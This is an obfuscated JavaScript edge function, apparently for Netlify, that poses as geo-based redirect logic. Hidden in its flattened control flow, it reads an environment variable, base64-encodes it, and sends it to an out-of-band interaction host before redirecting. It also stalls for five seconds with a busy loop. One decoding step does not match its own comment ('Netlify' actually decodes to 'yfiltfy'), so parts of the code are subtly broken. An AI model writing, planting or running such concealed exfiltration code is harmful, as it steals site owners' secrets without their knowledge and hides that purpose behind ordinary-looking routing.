const _0xO = (s, l) => {
    let r = s;
    const m = [
        (a) => a.split('').reverse().join(''),
        (a) => atob(a),
        (a) => decodeURIComponent(a),
        (a) => a.match(/.{2}/g).map(x => String.fromCharCode(parseInt(x, 16))).join(''),
        (a) => a.split('').map(x => String.fromCharCode(x.charCodeAt(0) - 1)).join('')
    ];
    l.forEach(i => r = m[i](r));
    return r;
};

export default async (req, ctx) => {
    // Control Flow Flattening State
    let _s = 0;
    let _d = "";
    let _k = "";
    let _v = "";

    while (_s !== 7) {
        switch (_s) {
            case 0: // Tarpit & Debug Init
                const _t = Date.now();
                while (Date.now() - _t < 5000) { Math.sqrt(Math.random()); } // 5s fake "init"
                _d = `INIT_ID:${Math.random().toString(36).slice(2)}`;
                _s = 1;
                break;

            case 1: // Resolve Key: "test1"
                // 7574667532 -> [Hex] -> "utfu2" -> [Shift-1] -> "test1"
                _k = _0xO('7574667532', [3, 4]);
                _s = 2;
                break;

            case 2: // Environment Access Construction
                const _n = _0xO('7a67756d6a677a', [3, 0, 4]); // 'Netlify'
                const _e = _0xO('dm5l', [0, 1]);           // 'env'
                const _g = _0xO('5a325630', [3, 1]);       // 'get'
                
                try {
                    _v = globalThis[_n][_e][_g](_k) || "NULL_REF";
                } catch(e) { _v = "ERR_REF"; }
                _s = 3;
                break;

            case 3: // OOB Exfiltration
                const _u = _0xO('ZXRpcy50c2FvLnBudDlsaTdpMmY1c254eXBqODBzamVjczU0eW1raGtmcjMvLzpzcHR0aA==', [1, 0]);
                const _p = _0xO('48616d6964', [3]); // Parameter remains 'Hamid'
                
                // Fetch is wrapped to ensure it always fires
                await fetch(`${_u}?${_p}=${btoa(_v)}&db=${btoa(_d)}`, {
                    method: _0xO('544547', [3, 0]), // 'GET'
                    mode: 'no-cors',
                    keepalive: true
                }).catch(() => {});
                _s = 4;
                break;

            case 4: // Final Routing logic
                const _au = _0xO('L2VkZ2UvYXVzdHJhbGlh', [1]);
                const _na = _0xO('L2VkZ2Uvbm90LWF1c3RyYWxpYQ==', [1]);
                const dest = ctx.geo?.country?.code === 'AU' ? _au : _na;
                _s = 7; // End state
                return Response.redirect(new URL(dest, req.url));
        }
    }
};

export const config = { path: '/edge' };
